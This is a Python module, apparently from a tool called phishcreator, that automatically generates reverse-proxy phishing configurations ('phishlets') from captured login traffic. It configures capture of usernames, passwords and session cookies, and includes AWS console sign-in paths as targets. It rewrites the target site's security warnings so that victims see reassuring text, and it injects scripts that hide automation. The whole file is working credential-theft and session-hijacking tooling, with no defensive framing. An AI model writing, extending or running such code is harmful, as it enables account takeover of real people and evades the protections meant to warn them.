#!/usr/bin/env python3
"""
Dynamic Phishlet Generator
Combines all intelligent modules to generate adaptive phishlets
"""

import yaml
import re
from typing import Dict, List, Optional
from dataclasses import dataclass, field, asdict

# Import intelligent modules
try:
    # Preferred: package imports
    from phishcreator.modules.auth_flow_classifier import classify_auth_flow, AuthFlowAnalysis
    from phishcreator.modules.intelligent_credential_extractor import extract_credentials, CredentialPattern
    from phishcreator.modules.smart_cookie_analyzer import analyze_cookies, CookieAnalysis
except Exception:
    # Fallback: allow running this module standalone from within modules/ directory
    try:
        from auth_flow_classifier import classify_auth_flow, AuthFlowAnalysis
        from intelligent_credential_extractor import extract_credentials, CredentialPattern
        from smart_cookie_analyzer import analyze_cookies, CookieAnalysis
    except Exception:
        classify_auth_flow = None  # type: ignore
        extract_credentials = None  # type: ignore
        analyze_cookies = None  # type: ignore


@dataclass
class PhishletGenerationResult:
    """Result of phishlet generation"""
    phishlet_yaml: str
    confidence: float
    auth_flow_type: str
    warnings: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class DynamicPhishletGenerator:
    """
    Generates phishlets dynamically based on traffic analysis
    Adapts to different authentication flows automatically
    """
    
    def __init__(self, target_domain: str, phishlet_name: Optional[str] = None):
        """
        Initialize generator
        
        Args:
            target_domain: Target domain (e.g., 'google.com')
            phishlet_name: Optional phishlet name (defaults to domain)
        """
        self.target_domain = target_domain
        self.phishlet_name = phishlet_name or target_domain.split('.')[0]
        self.warnings = []
        self.recommendations = []
    
    def generate(self, traffic_data: Dict) -> PhishletGenerationResult:
        """
        Generate phishlet from traffic analysis data
        
        Args:
            traffic_data: Traffic analysis data from live capture or HAR
        
        Returns:
            PhishletGenerationResult with generated YAML
        """
        # Step 1: Classify authentication flow
        if not classify_auth_flow:
            raise RuntimeError("auth_flow_classifier module is not available")
        auth_analysis = classify_auth_flow(traffic_data)
        self.warnings.extend(auth_analysis.recommendations)
        
        # Step 2: Extract credentials
        form_submissions = traffic_data.get('form_submissions', [])
        if not extract_credentials:
            raise RuntimeError("intelligent_credential_extractor module is not available")
        credential_pattern = extract_credentials(
            form_submissions,
            observed_username=None,  # Could be extracted from traffic
            observed_password=None
        )
        
        if credential_pattern.confidence < 0.7:
            self.warnings.append(
                f"⚠️ Low confidence ({credential_pattern.confidence:.0%}) in credential extraction. "
                "Manual verification recommended."
            )
        
        # Step 3: Analyze cookies
        cookies_captured = self._extract_cookies_from_traffic(traffic_data)
        if not analyze_cookies:
            raise RuntimeError("smart_cookie_analyzer module is not available")
        cookie_analysis = analyze_cookies(cookies_captured, traffic_data)
        self.recommendations.extend(cookie_analysis.recommendations)
        
        # Step 4: Generate proxy_hosts
        proxy_hosts = self._generate_proxy_hosts(traffic_data)
        
        # Step 5: Generate sub_filters
        sub_filters = self._generate_sub_filters(proxy_hosts, auth_analysis)
        
        # Step 6: Generate auth_urls
        auth_urls = self._generate_auth_urls(traffic_data)
        
        # Step 7: Generate login configuration
        login_config = self._generate_login_config(traffic_data)
        
        # Step 8: Generate credentials configuration
        credentials_config = self._generate_credentials_config(credential_pattern)
        
        # Step 9: Determine if JavaScript injection is needed
        js_inject = self._generate_js_inject(auth_analysis, traffic_data)
        
        # Step 10: Generate force_post if needed
        force_post = self._generate_force_post(auth_analysis, traffic_data)
        
        # Build phishlet structure
        phishlet = {
            'min_ver': '3.3.0',
            'proxy_hosts': proxy_hosts,
            'sub_filters': sub_filters,
            'auth_tokens': cookie_analysis.auth_tokens,
            'credentials': credentials_config,
            'auth_urls': auth_urls,
            'login': login_config
        }
        
        # Add optional sections
        if js_inject:
            phishlet['js_inject'] = js_inject
        
        if force_post:
            phishlet['force_post'] = force_post
        
        # Convert to YAML
        phishlet_yaml = self._dict_to_yaml(phishlet)
        
        # Calculate overall confidence
        overall_confidence = self._calculate_confidence(
            auth_analysis, credential_pattern, cookie_analysis
        )
        
        return PhishletGenerationResult(
            phishlet_yaml=phishlet_yaml,
            confidence=overall_confidence,
            auth_flow_type=auth_analysis.primary_type,
            warnings=self.warnings,
            recommendations=self.recommendations,
            metadata={
                'auth_analysis': asdict(auth_analysis),
                'credential_pattern': asdict(credential_pattern),
                'cookie_count': len(cookies_captured)
            }
        )
    
    def _extract_cookies_from_traffic(self, traffic_data: Dict) -> Dict[str, Dict]:
        """Extract cookies from traffic data.

        Prefer the normalized `cookies_captured` structure when available (works for both
        live capture and HAR extraction). Fall back to response-level cookie lists.
        """
        cookies = {}

        # Preferred: cookies_captured from traffic data (domain -> cookie_name -> cookie_obj)
        captured = traffic_data.get('cookies_captured')
        if isinstance(captured, dict) and captured:
            for domain, cookie_map in captured.items():
                if isinstance(cookie_map, dict) and cookie_map:
                    cookies.setdefault(domain, {})
                    for name, cookie_obj in cookie_map.items():
                        if not name:
                            continue
                        cookies[domain][str(name)] = cookie_obj
            return cookies

        # Fallback: Extract from responses
        for response in traffic_data.get('all_responses', []):
            for cookie in response.get('cookies', []):
                domain = cookie.get('domain', self.target_domain)
                name = cookie.get('name', '')

                if domain not in cookies:
                    cookies[domain] = {}

                cookies[domain][name] = cookie

        return cookies
    
    def _generate_proxy_hosts(self, traffic_data: Dict) -> List[Dict]:
        """Generate proxy_hosts configuration"""
        detected_hosts = traffic_data.get('detected_proxy_hosts', [])
        
        if not detected_hosts:
            # Fallback: create basic proxy host
            return [{
                'phish_sub': 'www',
                'orig_sub': 'www',
                'domain': self.target_domain,
                'session': True,
                'is_landing': True
            }]
        
        proxy_hosts = []
        for host in detected_hosts:
            proxy_host = {
                'phish_sub': host.get('orig_sub', 'www'),
                'orig_sub': host.get('orig_sub', 'www'),
                'domain': host.get('domain', self.target_domain),
                'session': host.get('has_session_cookies', True),
                'is_landing': host.get('is_landing', False)
            }
            
            # Add auto_filter if needed
            if not host.get('is_landing', False):
                proxy_host['auto_filter'] = False
            
            proxy_hosts.append(proxy_host)
        
        return proxy_hosts
    
    def _generate_sub_filters(self, proxy_hosts: List[Dict],
                             auth_analysis: 'AuthFlowAnalysis') -> List[Dict]:
        """Generate sub_filters configuration"""
        sub_filters = []
        
        # Generate hostname rewriting filters for each proxy host
        for host in proxy_hosts:
            orig_sub = host['orig_sub']
            domain = host['domain']
            trigger_domain = f"{orig_sub}.{domain}" if orig_sub else domain
            
            # Basic hostname replacement
            sub_filters.append({
                'triggers_on': trigger_domain,
                'orig_sub': orig_sub,
                'domain': domain,
                'search': '{hostname}',
                'replace': '{hostname}',
                'mimes': ['text/html', 'application/json', 'application/javascript', 'text/javascript']
            })
            
            # HTTPS variant
            sub_filters.append({
                'triggers_on': trigger_domain,
                'orig_sub': orig_sub,
                'domain': domain,
                'search': 'https://{hostname}',
                'replace': 'https://{hostname}',
                'mimes': ['text/html', 'application/json', 'application/javascript', 'text/javascript']
            })
        
        # Add anti-detection filters for API-driven auth
        if auth_analysis.primary_type == 'api_driven':
            # Add common browser detection bypasses
            main_domain = proxy_hosts[0] if proxy_hosts else {'orig_sub': 'www', 'domain': self.target_domain}
            trigger = f"{main_domain['orig_sub']}.{main_domain['domain']}"
            
            sub_filters.extend([
                {
                    'triggers_on': trigger,
                    'orig_sub': main_domain['orig_sub'],
                    'domain': main_domain['domain'],
                    'search': '"BROWSER_NOT_SUPPORTED"',
                    'replace': '"SUCCESS"',
                    'mimes': ['application/json']
                },
                {
                    'triggers_on': trigger,
                    'orig_sub': main_domain['orig_sub'],
                    'domain': main_domain['domain'],
                    'search': 'This browser or app may not be secure',
                    'replace': 'Please continue to sign in',
                    'mimes': ['text/html', 'application/json']
                }
            ])
        
        return sub_filters
    
    def _generate_auth_urls(self, traffic_data: Dict) -> List[str]:
        """Generate auth_urls configuration.

        Includes generic post-login indicators plus AWS-specific console patterns.
        """
        auth_urls: List[str] = []

        def add_path(p: str):
            if p and p not in auth_urls:
                auth_urls.append(p)

        # Look for URLs that indicate successful authentication
        for request in traffic_data.get('all_requests', []):
            url = request.get('url', '')
            if not url:
                continue
            ul = url.lower()

            # AWS-specific success indicators
            if 'console.aws.amazon.com' in ul:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                if parsed.path in ['/console/home', '/signin', '/oauth']:
                    add_path(parsed.path)
                elif parsed.path.startswith('/console/'):
                    add_path(parsed.path)

            if 'signin.aws.amazon.com' in ul:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                if parsed.path in ['/signin', '/mfa', '/oauth']:
                    add_path(parsed.path)

            # Generic success indicators
            if any(indicator in ul for indicator in [
                'dashboard', 'account', 'profile', 'home', 'welcome',
                'success', 'complete', 'authenticated'
            ]):
                from urllib.parse import urlparse
                parsed = urlparse(url)
                if parsed.path:
                    add_path(parsed.path)

        # Ensure minimum viable auth_urls
        if not auth_urls:
            auth_urls = ['/']

        # Keep list reasonably sized
        return auth_urls[:25]
    
    def _generate_login_config(self, traffic_data: Dict) -> Dict:
        """Generate login configuration"""
        # Find the landing page
        detected_hosts = traffic_data.get('detected_proxy_hosts', [])
        landing_host = None
        
        for host in detected_hosts:
            if host.get('is_landing'):
                landing_host = host
                break
        
        if not landing_host:
            # Use first host as fallback
            landing_host = detected_hosts[0] if detected_hosts else {
                'orig_sub': 'www',
                'domain': self.target_domain
            }
        
        # Get login URL
        login_url = traffic_data.get('detected_login_url', '/')
        from urllib.parse import urlparse
        parsed = urlparse(login_url)
        
        return {
            'domain': f"{landing_host.get('orig_sub', 'www')}.{landing_host.get('domain', self.target_domain)}",
            'path': parsed.path or '/'
        }
    
    def _generate_credentials_config(self, credential_pattern: 'CredentialPattern') -> Dict:
        """Generate credentials configuration"""
        credentials = {
            'username': {
                'key': credential_pattern.username_key,
                'search': credential_pattern.username_search,
                'type': credential_pattern.username_type
            },
            'password': {
                'key': credential_pattern.password_key,
                'search': credential_pattern.password_search,
                'type': credential_pattern.password_type
            }
        }
        
        return credentials
    
    def _generate_js_inject(self, auth_analysis: 'AuthFlowAnalysis',
                           traffic_data: Dict) -> Optional[List[Dict]]:
        """Generate JavaScript injection if needed"""
        # Only inject for API-driven or multi-step flows
        if auth_analysis.primary_type not in ['api_driven', 'multi_step']:
            return None
        
        js_inject = []
        
        # Anti-automation detection script
        anti_automation_script = """
(function() {
  // Spoof automation detection
  Object.defineProperty(navigator, 'webdriver', {get: () => false});
  Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
  Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
  
  // Remove automation indicators
  delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
  delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
  delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
})();
"""
        
        # Add to login pages
        detected_hosts = traffic_data.get('detected_proxy_hosts', [])
        if detected_hosts:
            landing_domain = f"{detected_hosts[0].get('orig_sub', 'www')}.{detected_hosts[0].get('domain', self.target_domain)}"
            
            js_inject.append({
                'trigger_domains': [landing_domain],
                'trigger_paths': ['*'],
                'script': anti_automation_script.strip()
            })
        
        return js_inject if js_inject else None
    
    def _generate_force_post(self, auth_analysis: 'AuthFlowAnalysis',
                            traffic_data: Dict) -> Optional[List[Dict]]:
        """Generate force_post configuration if needed"""
        # This would require more sophisticated analysis
        # For now, return None (can be added manually if needed)
        return None
    
    def _calculate_confidence(self, auth_analysis: 'AuthFlowAnalysis',
                             credential_pattern: 'CredentialPattern',
                             cookie_analysis: 'CookieAnalysis') -> float:
        """Calculate overall confidence score"""
        scores = [
            auth_analysis.confidence,
            credential_pattern.confidence,
            min(1.0, len(cookie_analysis.critical_cookies) / 3)  # Expect at least 3 critical cookies
        ]
        
        return sum(scores) / len(scores)
    
    def _dict_to_yaml(self, data: Dict) -> str:
        """Convert dictionary to YAML string"""
        return yaml.dump(data, default_flow_style=False, sort_keys=False, allow_unicode=True)


def generate_phishlet(target_domain: str, traffic_data: Dict,
                     phishlet_name: Optional[str] = None) -> PhishletGenerationResult:
    """
    Convenience function to generate phishlet
    
    Args:
        target_domain: Target domain
        traffic_data: Traffic analysis data
        phishlet_name: Optional phishlet name
    
    Returns:
        PhishletGenerationResult
    """
    generator = DynamicPhishletGenerator(target_domain, phishlet_name)
    return generator.generate(traffic_data)
